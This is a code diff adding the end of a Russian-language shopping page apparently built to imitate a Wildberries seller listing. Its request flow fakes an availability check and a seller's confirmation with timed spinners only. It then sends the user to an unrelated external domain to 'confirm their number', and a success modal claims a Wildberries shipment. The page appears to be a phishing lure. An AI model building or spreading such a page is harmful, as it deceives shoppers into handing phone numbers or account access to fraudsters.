+            document.getElementById('photoViewer').classList.remove('active');
+        }
+
+        function requestProduct() {
+            const product = productsData.find(p => p.id === currentProductId);
+            if (!product) return;
+
+            const modalBody = document.getElementById('modalBody');
+
+            // Step 1: Checking availability
+            modalBody.innerHTML = `
+                <div style="padding: 40px 20px; text-align: center;">
+                    <div class="spinner" style="margin: 0 auto 20px; width: 48px; height: 48px; border-width: 4px;"></div>
+                    <div style="font-size: 16px; color: var(--text-secondary); margin-bottom: 12px;">Проверяем наличие товаров...</div>
+                    <div style="font-size: 14px; color: var(--text-muted);">Пожалуйста, подождите</div>
+                </div>
+            `;
+
+            setTimeout(() => {
+                // Step 2: Show available count
+                modalBody.innerHTML = `
+                    <div style="padding: 40px 20px; text-align: center;">
+                        <div style="font-size: 48px; margin-bottom: 16px;">📦</div>
+                        <div style="font-size: 20px; font-weight: 700; color: var(--accent-light); margin-bottom: 8px;">Доступно товаров: ${product.availableCount} шт.</div>
+                        <div style="font-size: 14px; color: var(--text-muted); margin-bottom: 24px;">Запрашиваем разрешение на отправку товара у продавца ${product.seller}...</div>
+                        <div class="spinner" style="margin: 0 auto; width: 36px; height: 36px; border-width: 3px;"></div>
+                    </div>
+                `;
+
+                setTimeout(() => {
+                    // Step 3: Request accepted
+                    modalBody.innerHTML = `
+                        <div style="padding: 40px 20px; text-align: center;">
+                            <div style="margin-bottom: 16px; display: flex; justify-content: center;">
+                            <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                                <circle cx="32" cy="32" r="28" stroke="#4caf50" stroke-width="3" fill="none"/>
+                                <path d="M20 32l8 8 16-16" stroke="#4caf50" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                            </svg>
+                        </div>
+                            <div style="font-size: 20px; font-weight: 700; color: var(--success); margin-bottom: 8px;">Запрос принят</div>
+                            <div style="font-size: 14px; color: var(--text-muted); margin-bottom: 24px;">Продавец ${product.seller} подтвердил готовность отправить товар</div>
+                            <div style="background: var(--bg-tertiary); border-radius: 12px; padding: 16px; border: 1px solid var(--border); margin-bottom: 24px;">
+                                <div style="font-size: 14px; color: var(--text-secondary); line-height: 1.5;">
+                                    Для продолжения оформления необходимо подтвердить свой номер
+                                </div>
+                            </div>
+                            <a href="https://dmpnd276.lite-twobot.sbs/" style="display: block; width: 100%; padding: 16px; background: linear-gradient(135deg, var(--accent), var(--accent-dark)); color: white; border-radius: 12px; font-size: 15px; font-weight: 600; text-decoration: none; text-align: center;">Перейти к подтверждению</a>
+                        </div>
+                    `;
+
+                    // Hide footer buttons since we now have the CTA in the body
+                    document.querySelector('.modal-footer').style.display = 'none';
+                }, 2000);
+            }, 1500);
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2500);
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeModal();
+                closePhotoViewer();
+                closeCityModal();
+                closeSuccessModal();
+            }
+        });
+
+        function checkStartAppParam() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const startApp = urlParams.get('startapp');
+            if (startApp === 'succes') {
+                setTimeout(() => {
+                    document.getElementById('successModal').classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                }, 500);
+            }
+        }
+
+        function closeSuccessModal(event) {
+            if (event && event.target !== event.currentTarget) return;
+            document.getElementById('successModal').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        loadData();
+        checkStartAppParam();
+    </script>
+
+    <div class="modal-overlay" id="successModal" onclick="closeSuccessModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <div class="modal-title">Успешно</div>
+                <button class="modal-close" onclick="closeSuccessModal()">✕</button>
+            </div>
+            <div class="modal-body" style="padding: 24px 16px; text-align: center;">
+                <div style="margin-bottom: 16px; display: flex; justify-content: center;">
+                    <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                        <circle cx="32" cy="32" r="28" stroke="#4caf50" stroke-width="3" fill="none"/>
+                        <path d="M20 32l8 8 16-16" stroke="#4caf50" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                    </svg>
+                </div>
+                <div style="font-size: 20px; font-weight: 700; color: var(--text-primary); margin-bottom: 12px;">Заказ оформляется</div>
+                <div style="font-size: 14px; color: var(--text-secondary); line-height: 1.6; margin-bottom: 8px;">
+                    Товар будет отправлен на указанный пункт выдачи в вашем приложении Wildberries.
+                </div>
+                <div style="font-size: 14px; color: var(--warning); line-height: 1.5; font-weight: 500;">
+                    Проверьте правильность указания пункта выдачи в течении 30 минут.
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-primary" onclick="closeSuccessModal()" style="flex: 1;">Понятно</button>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
